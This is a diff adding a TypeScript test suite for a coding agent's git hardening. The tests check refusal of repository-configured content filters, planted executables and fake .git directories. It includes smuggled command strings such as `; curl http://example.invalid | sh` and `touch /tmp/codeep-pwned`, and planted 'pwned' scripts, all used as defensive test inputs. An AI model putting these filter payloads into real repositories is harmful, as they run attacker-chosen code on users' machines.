+    expect(getGitDiff(false, repoDir).error).toContain('filter.nbstripout.clean');
+    expect(fired()).toEqual([]);
+  });
+
+  it('refuses when the routing would come from a tree the working tree does not show', () => {
+    // `attr.tree` is one of the sources the routing check could not see, and
+    // the reason it could not be made sound cheaply: the attributes live in a
+    // tree object, so no file on disk says `filter=nbstripout` and the old
+    // check answered "inert" — while git happily routed `*.txt` at the
+    // driver. Committed on a side branch and left out of the working tree, so
+    // this is exactly the shape the check missed.
+    writeFileSync(join(repoDir, '.gitattributes'), '*.txt filter=nbstripout\n');
+    git(repoDir, ['add', '.gitattributes']);
+    git(repoDir, ['commit', '-qm', 'attributes on a side tree']);
+    const tree = git(repoDir, ['rev-parse', 'HEAD^{tree}']).trim();
+    rmSync(join(repoDir, '.gitattributes'));
+    git(repoDir, ['rm', '-q', '--cached', '.gitattributes']);
+    git(repoDir, ['commit', '-qm', 'take the attributes back out']);
+
+    // Nothing on disk and nothing in the index routes anything now — and git
+    // still runs the filter when pointed at that tree.
+    expect(getGitStatus(repoDir).refusal).toContain('filter.nbstripout.clean');
+    expect(tree).toMatch(/^[0-9a-f]{40}$/);
+    expect(fired()).toEqual([]);
+  });
+
+  it('refuses over a submodule driver that nothing in the submodule routes either', () => {
+    const lib = join(base, 'lib');
+    git(base, ['init', '-q', 'lib']);
+    git(lib, ['config', 'user.email', 'test@test.com']);
+    git(lib, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(lib, 'plain.txt'), 'before\n');
+    git(lib, ['add', '-A']);
+    git(lib, ['commit', '-qm', 'initial']);
+    git(repoDir, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(repoDir, ['commit', '-qm', 'add submodule']);
+    git(repoDir, ['config', '--unset', 'filter.nbstripout.clean']);
+    git(join(repoDir, 'vendor', 'lib'), ['config', 'filter.leftover.clean', `${trap('sub-clean')}; cat`]);
+
+    const status = getGitStatus(repoDir);
+
+    expect(status.refusal).toContain('filter.leftover.clean');
+    // And it still points at the submodule rather than at the superproject,
+    // where `git config --unset` would silently clear nothing.
+    expect(status.refusal).toContain(join(repoDir, 'vendor', 'lib'));
+    expect(fired()).toEqual([]);
+  });
+
+  it('says in the message why a driver nothing appears to use is refused anyway', () => {
+    // Without this sentence the leftover-config user reads a refusal naming a
+    // driver, greps their tree for it, finds nothing, and concludes Codeep is
+    // broken. The message has to carry the reason and the fix, because it is
+    // the only thing they are shown.
+    const refusal = getGitStatus(repoDir).refusal ?? '';
+
+    expect(refusal).toMatch(/even if nothing routes a path at "nbstripout"/);
+    expect(refusal).toContain('git config --unset filter.nbstripout.clean');
+    // And it still warns off the `required false` workaround, which is the
+    // first thing a search for "clean filter failed" suggests.
+    expect(refusal).toContain('filter.nbstripout.required false');
+  });
+
+  it('still leaves the well-known integrations running', () => {
+    // The revert is about the UNKNOWN command lines. A git-lfs repository
+    // must keep working, or the flat refusal is a wall in front of every
+    // repository that ever ran `git lfs install --local`.
+    git(repoDir, ['config', '--unset', 'filter.nbstripout.clean']);
+    git(repoDir, ['config', 'filter.lfs.clean', 'git-lfs clean -- %f']);
+    git(repoDir, ['config', 'filter.lfs.process', 'git-lfs filter-process']);
+
+    const status = getGitStatus(repoDir);
+
+    expect(status.refusal).toBeUndefined();
+    expect(status.branch).toBeTruthy();
+    expect(status.hasChanges).toBe(true);
+  });
+});
+
+/**
+ * A brand-new repository, which is where the refusal machinery meets the
+ * user who has done nothing wrong.
+ *
+ * `git init` and one agent run is the first thing that happens in a new
+ * project, and `git rev-parse --abbrev-ref HEAD` answers `fatal: ambiguous
+ * argument 'HEAD'` there (git 2.54) because there is no commit for HEAD to
+ * name. That is an ordinary git failure and it fills `error` — so anything
+ * that reads `error` and puts it in front of the user is showing raw git
+ * plumbing to somebody who has just started.
+ */
+describe.skipIf(!hasGit)('a repository with no commits yet', () => {
+  isolateGitConfig();
+  let fresh: string;
+
+  beforeEach(() => {
+    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-fresh-')));
+    fresh = join(base, 'project');
+    mkdirSync(fresh);
+    git(base, ['init', '-q', 'project']);
+    git(fresh, ['config', 'user.email', 'test@test.com']);
+    git(fresh, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(fresh, 'app.ts', ), 'export const x = 1;\n');
+  });
+
+  afterEach(() => {
+    rmSync(base, { recursive: true, force: true });
+  });
+
+  it('fills `error` but NOT `refusal`, so nothing tells the user to remove a config key', () => {
+    const status = getGitStatus(fresh);
+
+    expect(status.isRepo).toBe(true);
+    // The fixture is the real thing, not a contrivance: this is git's own
+    // message for a repository with no commit.
+    expect(status.error).toMatch(/ambiguous argument 'HEAD'|unknown revision/);
+    expect(status.refusal).toBeUndefined();
+  });
+
+  it('still reports the changes, so the branch read failing does not cost the status', () => {
+    // The branch read threw and the outer catch took the rest of the function
+    // with it, so `hasChanges` came back undefined in every brand-new
+    // repository. Only the branch is unknown here; the working tree is
+    // perfectly readable and `git status --porcelain` answers for it.
+    const status = getGitStatus(fresh);
+
+    expect(status.branch).toBeUndefined();
+    expect(status.hasChanges).toBe(true);
+    expect(getChangedFiles(fresh)).toContain('app.ts');
+  });
+
+  it('autoCommitAgentChanges makes the first commit instead of reporting no changes', () => {
+    // The whole point of the fix. `git init` plus one agent run is the first
+    // thing that happens in a new project, and the auto-commit read
+    // `hasChanges` — which the aborted status left undefined — so it answered
+    // "No changes detected by git" over a working tree full of the files the
+    // agent had just written, and never committed once until the user made a
+    // first commit by hand.
+    const result = autoCommitAgentChanges(
+      'add the entrypoint',
+      [{ type: 'write', target: 'app.ts', result: 'success', timestamp: Date.now() }],
+      fresh
+    );
+
+    expect(result.error).toBeUndefined();
+    expect(result.success).toBe(true);
+    expect(result.hash).toMatch(/^[0-9a-f]{7,}$/);
+    // The commit is real, and it carries the file.
+    expect(git(fresh, ['show', '--name-only', '--format=', 'HEAD']).trim()).toBe('app.ts');
+  });
+
+  it('keeps the ordinary sentence when there is genuinely nothing to commit', () => {
+    // The other half: reading `refusal` rather than `error` is what stops the
+    // brand-new repository being told to remove a config key it does not
+    // have. With nothing in the working tree, `hasChanges` is false and the
+    // sentence is the plain one.
+    rmSync(join(fresh, 'app.ts'));
+
+    const result = autoCommitAgentChanges(
+      'add the entrypoint',
+      [{ type: 'write', target: 'app.ts', result: 'success', timestamp: Date.now() }],
+      fresh
+    );
+
+    expect(result.success).toBe(false);
+    expect(result.error).toBe('No changes detected by git');
+    expect(result.error).not.toMatch(/fatal:|ambiguous argument|rev-parse|git config --unset/);
+  });
+});
+
+/**
+ * `<cwd>/.git` is a DIRECTORY — which the layout's fast path took as proof
+ * that `cwd` is the repository root, and it is not proof of anything. Any
+ * directory can be called `.git`, and a half-built or half-deleted git
+ * directory has the same shape.
+ *
+ * What that cost is not cosmetic. The layout decides where the submodule
+ * enumeration looks: `<cwd>/.git/modules` for the names, and `cwd` as the
+ * root the index's gitlink paths are resolved against. Both were wrong here,
+ * so every gitlink landed on a directory that is not there and the whole
+ * enumeration came back empty — silently, while git, run from that same
+ * directory, walked up to the real repository and ran the submodule's
+ * `filter.<d>.clean` on a plain `git status`. Both suites below arm exactly
+ * that filter and prove it fires before asserting that Codeep refuses.
+ */
+describe.skipIf(!hasGit || !posix)('a .git directory that is not a repository', () => {
+  isolateGitConfig();
+  let superRepo: string;
+
+  beforeEach(() => {
+    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-layout-')));
+    markers = join(base, 'markers');
+    mkdirSync(markers);
+
+    const lib = join(base, 'lib');
+    git(base, ['init', '-q', 'lib']);
+    git(lib, ['config', 'user.email', 'test@test.com']);
+    git(lib, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(lib, '.gitattributes'), '*.bin filter=deep\n');
+    writeFileSync(join(lib, 'notes.bin'), 'before\n');
+    git(lib, ['add', '-A']);
+    git(lib, ['commit', '-qm', 'initial']);
+
+    superRepo = join(base, 'super');
+    git(base, ['init', '-q', 'super']);
+    git(superRepo, ['config', 'user.email', 'test@test.com']);
+    git(superRepo, ['config', 'user.name', 'Test User']);
+    git(superRepo, ['-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', '../lib', 'vendor/lib']);
+    git(superRepo, ['commit', '-qm', 'add submodule']);
+
+    const submodule = join(superRepo, 'vendor', 'lib');
+    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
+    // Same length as the original, so git cannot skip the content comparison
+    // that runs the clean filter.
+    writeFileSync(join(submodule, 'notes.bin'), 'after.\n');
+  });
+
+  afterEach(() => {
+    rmSync(base, { recursive: true, force: true });
+  });
+
+  /**
+   * Prove that a git call made in `dir` really does run the submodule's clean
+   * filter — i.e. that this directory is one where the refusal has something
+   * to refuse over. Without it, "Codeep stopped" would pass just as happily
+   * in a directory git ignores.
+   */
+  function proveReachableFrom(dir: string): void {
+    git(dir, ['status', '--porcelain']);
+    expect(fired()).toEqual(['sub-clean']);
+    rmSync(join(markers, 'sub-clean'));
+  }
+
+  it('does not take a plain directory named .git for the repository root', () => {
+    // `mkdir sub/.git` is the entire setup. It needs no privileges, it is
+    // something a build tool or an unpacked archive can leave behind, and a
+    // prompt injection that gets `write_file` pointed at it is the same
+    // thing done deliberately.
+    const work = join(superRepo, 'sub');
+    mkdirSync(join(work, '.git'), { recursive: true });
+    writeFileSync(join(work, '.git', 'notes.txt'), 'not a git directory\n');
+
+    proveReachableFrom(work);
+
+    expect(() => hardenedGitEnv({ cwd: work, noHooks: true })).toThrow(/filter\.deep\.clean/);
+    // The refusal cost nothing: building an environment runs `git config
+    // --list`, `git rev-parse` and `git ls-files`, none of which refresh an
+    // index, so the trap is still cold.
+    expect(fired()).toEqual([]);
+  });
+
+  it('does not take a git directory with no HEAD for the repository root', () => {
+    // The other half, and the one that is an accident rather than an attack:
+    // an interrupted `git init` or `git clone`, or a `.git` somebody deleted
+    // a file out of. git's own validate_headref() is what decides this, and
+    // one `statSync` of HEAD is the cheap approximation of it — git walks
+    // straight past such a directory to the repository above, and so must
+    // the layout.
+    const work = join(superRepo, 'work');
+    mkdirSync(work);
+    git(base, ['init', '-q', work]);
+    rmSync(join(work, '.git', 'HEAD'));
+    // Everything else a git directory has is still there, so `isDirectory()`
+    // is as true as it ever was.
+    expect(existsSync(join(work, '.git', 'objects'))).toBe(true);
+    expect(existsSync(join(work, '.git', 'config'))).toBe(true);
+
+    proveReachableFrom(work);
+
+    expect(() => hardenedGitEnv({ cwd: work, noHooks: true })).toThrow(/filter\.deep\.clean/);
+    expect(fired()).toEqual([]);
+  });
+});
+
+/**
+ * A repository with a lot of files in it — a monorepo, not a hostile
+ * repository.
+ *
+ * The submodule enumeration lists the whole index on EVERY hardened git call,
+ * and it did that through the config scan's 16MB buffer. That buffer is sized
+ * for a `.git/config` somebody PADDED, where 16MB is already absurd; an index
+ * listing is sized by how many files the repository has, where 16MB is about
+ * 100k paths. Past it execFileSync threw ENOBUFS and the catch turned that
+ * into a hardening refusal — so every git call in the repository stopped,
+ * with a message about submodules the user does not have, and no fixture in
+ * this file was big enough to notice.
+ */
+describe.skipIf(!hasGit || !posix)('a repository whose index is bigger than the config scan buffer', () => {
+  isolateGitConfig();
+  let monorepo: string;
+
+  /** The buffer the index listing used to share with the config scan. */
+  const OLD_SHARED_BUFFER = 16 * 1024 * 1024;
+
+  /**
+   * Put more paths in the index than a 16MB listing can hold.
+   *
+   * `git update-index --index-info` writes index entries directly, so this
+   * costs one pass over a string instead of 22k files on disk: measured at
+   * ~80ms here, against the several minutes the honest version would take.
+   * The paths are long on purpose — the listing is dominated by them, so
+   * fewer, longer entries reach the same number of bytes for less work.
+   */
+  function padIndexBeyondSharedBuffer(): number {
+    // One real blob, reused by every entry: `--index-info` wants an object
+    // that exists, and 22k of them would be the slow way to say the same
+    // thing.
+    const blob = git(monorepo, ['hash-object', '-w', '--stdin'], 'pad\n').trim();
+    const dir = Array(15).fill('pad'.padEnd(63, 'd')).join('/');
+    const lines: string[] = [];
+    for (let i = 0; i < 22_000; i++) {
+      lines.push(`100644 ${blob} 0\t${dir}/file${String(i).padStart(6, '0')}.txt`);
+    }
+    git(monorepo, ['update-index', '--index-info'], `${lines.join('\n')}\n`);
+    return lines.length;
+  }
+
+  beforeEach(() => {
+    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-big-index-')));
+    markers = join(base, 'markers');
+    mkdirSync(markers);
+    monorepo = join(base, 'repo');
+    git(base, ['init', '-q', 'repo']);
+    git(monorepo, ['config', 'user.email', 'test@test.com']);
+    git(monorepo, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(monorepo, 'app.ts'), 'export const x = 1;\n');
+    git(monorepo, ['add', '-A']);
+    git(monorepo, ['commit', '-qm', 'initial']);
+    padIndexBeyondSharedBuffer();
+  });
+
+  afterEach(() => {
+    rmSync(base, { recursive: true, force: true });
+  });
+
+  it('is an index the old buffer really could not hold, so the test below is not vacuous', () => {
+    // The fixture asserting itself. A padding loop that quietly stopped
+    // short would leave every other test here passing for the wrong reason,
+    // and the byte count is not something to eyeball — this is the same
+    // command the enumeration runs, through the buffer it used to run it
+    // with.
+    expect(() =>
+      execFileSync('git', ['ls-files', '-s', '-z', '--full-name', '--abbrev=4', '--', ':/'], {
+        cwd: monorepo,
+        maxBuffer: OLD_SHARED_BUFFER,
+        stdio: ['ignore', 'pipe', 'pipe'],
+      })
+    ).toThrow(/ENOBUFS/);
+  });
+
+  it('hardens the repository instead of refusing it', () => {
+    // The whole finding in one line: having files is not a hostile config,
+    // and Codeep must not answer it with the refusal it reserves for one.
+    expect(() => hardenedGitEnv({ cwd: monorepo, noHooks: true })).not.toThrow();
+  });
+
+  it('reads the listing whole, so a gitlink past the old buffer is still found', () => {
+    // A bigger buffer that still truncated would be the worse bug: no
+    // refusal, no error, and a submodule nobody looked at. The gitlink sorts
+    // AFTER every padding path ("z" > "p"), so it only exists for a reader
+    // that got to the end — and nothing declares it, so the name-based half
+    // of the enumeration cannot find it either. It has to come out of the
+    // index listing or not at all.
+    git(monorepo, ['init', '-q', join(monorepo, 'zz-vendor', 'lib')]);
+    const submodule = join(monorepo, 'zz-vendor', 'lib');
+    git(submodule, ['config', 'user.email', 'test@test.com']);
+    git(submodule, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(submodule, 'notes.txt'), 'x\n');
+    git(submodule, ['add', '-A']);
+    git(submodule, ['commit', '-qm', 'initial']);
+    git(monorepo, ['add', 'zz-vendor/lib']);
+    git(submodule, ['config', 'filter.deep.clean', `${trap('sub-clean')}; cat`]);
+    expect(existsSync(join(monorepo, '.gitmodules'))).toBe(false);
+
+    expect(() => hardenedGitEnv({ cwd: monorepo, noHooks: true })).toThrow(/filter\.deep\.clean/);
+  });
+});
+
+/**
+ * A repository where git itself fails — not a refusal, and not a repository
+ * with nothing to commit.
+ *
+ * `autoCommitAgentChanges` read `status.refusal` and then `status.hasChanges`,
+ * and nothing in between, so every git failure that is not a hardening
+ * refusal came out as "No changes detected by git" — the sentence for a clean
+ * working tree. The agent had just written files, the user had auto-commit
+ * switched on, and the message said there was nothing to commit. Worse,
+ * agentExecution.ts matches that exact string to decide what NOT to show, so
+ * the failure was swallowed on its way to the screen as well.
+ *
+ * The other two cases are asserted where their fixtures live: the refusal in
+ * "a repository that configures its own content filter", and the genuinely
+ * clean tree in "a repository with no commits yet".
+ */
+describe.skipIf(!hasGit)('a repository whose git status fails outright', () => {
+  isolateGitConfig();
+  let broken: string;
+
+  beforeEach(() => {
+    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-git-broken-')));
+    broken = join(base, 'project');
+    git(base, ['init', '-q', 'project']);
+    git(broken, ['config', 'user.email', 'test@test.com']);
+    git(broken, ['config', 'user.name', 'Test User']);
+    writeFileSync(join(broken, 'app.ts'), 'export const x = 1;\n');
+    git(broken, ['add', '-A']);
+    git(broken, ['commit', '-qm', 'initial']);
+    // The change the agent just made, which is what the auto-commit is for.
+    writeFileSync(join(broken, 'app.ts'), 'export const x = 2;\n');
+    // `core.bare = true` over a checkout that HAS a working tree. git then
+    // declines every command that needs one — "fatal: this operation must be
+    // run in a work tree" — while `rev-parse` and `ls-files` keep answering,
+    // so the hardening completes and only the status read fails. It is a real
+    // shape (a `.git` copied out of a bare clone leaves it behind) and a
+    // deterministic one: no permissions, no sizes, no timing.
+    git(broken, ['config', 'core.bare', 'true']);
+  });
+
+  afterEach(() => {
+    rmSync(base, { recursive: true, force: true });
+  });
+
+  it('is a git failure and not a refusal, which is what makes the two branches different', () => {
+    const status = getGitStatus(broken);
+
+    expect(status.refusal).toBeUndefined();
+    expect(status.error).toMatch(/must be run in a work tree/);
+    // The field autoCommitAgentChanges reads: undefined because nobody knows,
+    // not false because there is nothing.
+    expect(status.hasChanges).toBeUndefined();
+  });
+
+  it('autoCommitAgentChanges reports the failure instead of "No changes detected by git"', () => {
+    const result = autoCommitAgentChanges(
+      'change the entrypoint',
+      [{ type: 'edit', target: 'app.ts', result: 'success', timestamp: Date.now() }],
+      broken
+    );
+
+    expect(result.success).toBe(false);
+    expect(result.error).toMatch(/must be run in a work tree/);
+    // Not the sentence for a clean tree — which agentExecution.ts matches on
+    // to decide the run had nothing to say.
+    expect(result.error).not.toBe('No changes detected by git');
+  });
+});
+
+/**
+ * The absolute-path arm of the content-filter allowlist, on its own.
+ *
+ * `git lfs install` writes `git-lfs filter-process` when git-lfs is the one
+ * on PATH and an absolute path when it is not, and git-annex does the same —
+ * so the whole-value list refused perfectly ordinary repositories, which is
+ * the fail-closed policy landing on the integrations it exists to keep
+ * running. The relaxation compares the program's BASENAME plus the argument
+ * tail exactly, and then insists the path names the program PATH already
+ * resolves that basename to.
+ *
+ * That last condition is the one doing the security work, and the "plants its
+ * own" test below is why: without it the repository picks the program, and
+ * one checked-in executable called `git-lfs` — or `cat`, which is on the list
+ * with no arguments at all — is the end of the rule.
+ *
+ * No git here: these are the byte-level decisions, and a live repository
+ * would only make them slower to read. The end-to-end half is in the
+ * known-safe-integration suite above.
+ */
+describe.skipIf(!posix)('isSafeContentFilterCommand, the absolute-path spellings', () => {
+  let bin: string;
+  let program: string;
+  let env: NodeJS.ProcessEnv;
+
+  beforeEach(() => {
+    base = realpathSync(mkdtempSync(join(tmpdir(), 'codeep-filter-allowlist-')));
+    bin = join(base, 'bin');
+    mkdirSync(bin);
+    program = join(bin, 'git-lfs');
+    writeFileSync(program, '#!/bin/sh\ncat\n');
+    chmodSync(program, 0o755);
+    // The only PATH these decisions may consult, so the machine this runs on
+    // cannot change the answer.
+    env = { PATH: bin };
+  });
+
+  afterEach(() => {
+    rmSync(base, { recursive: true, force: true });
+  });
+
+  it('accepts the program PATH resolves to, with the tail exactly as the list spells it', () => {
+    expect(isSafeContentFilterCommand(`${program} filter-process`, env)).toBe(true);
+    expect(isSafeContentFilterCommand(`${program} filter-process --skip`, env)).toBe(true);
+    expect(isSafeContentFilterCommand(`${program} clean -- %f`, env)).toBe(true);
+    expect(isSafeContentFilterCommand(`${program} smudge -- %f`, env)).toBe(true);
+  });
+
+  it('accepts every bare spelling without consulting the filesystem at all', () => {
+    // The literals answer first, so a machine with none of these programs
+    // installed decides them the same way as a machine with all of them.
+    for (const command of SAFE_CONTENT_FILTER_COMMANDS) {
+      expect(isSafeContentFilterCommand(command, { PATH: '/nonexistent' }), command).toBe(true);
+    }
+  });
+
+  it('refuses a program the repository planted, however familiar the name', () => {
+    // The attack the basename comparison would otherwise hand over, and it
+    // needs nothing but a file: check in an executable called `git-lfs`,
+    // point the filter at it with a tail that is on the list, and git runs
+    // it on the next `git status`.
+    const planted = join(base, 'checkout', 'tools');
+    mkdirSync(planted, { recursive: true });
+    const theirs = join(planted, 'git-lfs');
+    writeFileSync(theirs, '#!/bin/sh\necho pwned\n');
+    chmodSync(theirs, 0o755);
+
+    expect(isSafeContentFilterCommand(`${theirs} filter-process`, env)).toBe(false);
+    // `cat` is the sharper version of the same thing: it is on the list with
+    // no arguments, so the whole value is one path the repository chose.
+    const theirCat = join(planted, 'cat');
+    writeFileSync(theirCat, '#!/bin/sh\necho pwned\n');
+    chmodSync(theirCat, 0o755);
+    expect(isSafeContentFilterCommand(theirCat, env)).toBe(false);
+  });
+
+  it.each([
+    ['a trailing shell command', (p: string) => `${p} filter-process; curl http://example.invalid | sh`],
+    ['a bare trailing semicolon', (p: string) => `${p} filter-process;`],
+    ['a leading command', (p: string) => `touch /tmp/codeep-pwned && ${p} filter-process`],
+    ['an extra argument', (p: string) => `${p} filter-process --skip --extra`],
+    ['a tail that is not on the list', (p: string) => `${p} smudge`],
+    ['a tail from the wrong program', (p: string) => `${p} clean`],
+    ['double spaces between the words', (p: string) => `${p}  filter-process`],
+    ['a tab between the words', (p: string) => `${p}\tfilter-process`],
+    ['a no-break space between the words', (p: string) => `${p} filter-process`],
+    [
+      'a non-breaking hyphen in the program name',
+      (p: string) => `${p.replace(/git-lfs$/, 'git‑lfs')} filter-process`,
+    ],
+    ['an uppercase program name', (p: string) => `${p.replace(/git-lfs$/, 'GIT-LFS')} filter-process`],
+    ['an uppercase argument', (p: string) => `${p} FILTER-PROCESS`],
+    ['a quoted program, which the bare spellings allow and this one does not', (p: string) => `"${p}" filter-process`],
+    ['a relative path', () => 'bin/git-lfs filter-process'],
+    ['a bare program name that is not on the list', () => 'git-lfs-wrapper filter-process'],
+    [
+      'a .. that walks back out of the directory PATH names',
+      (p: string) => `${p.replace(/git-lfs$/, '../bin/git-lfs')} filter-process`,
+    ],
+    ['a trailing space', (p: string) => `${p} filter-process `],
+    ['a newline', (p: string) => `${p} filter-process\ntouch /tmp/codeep-pwned`],
+  ])('refuses an absolute-path spelling with %s', (_name, build) => {
+    // Every one of these differs from an accepted value by the bytes alone —
+    // same fixture, same PATH, same program on disk — so what refuses them is
+    // the comparison and not a missing file.
+    expect(isSafeContentFilterCommand(build(program), env)).toBe(false);
   });
 });
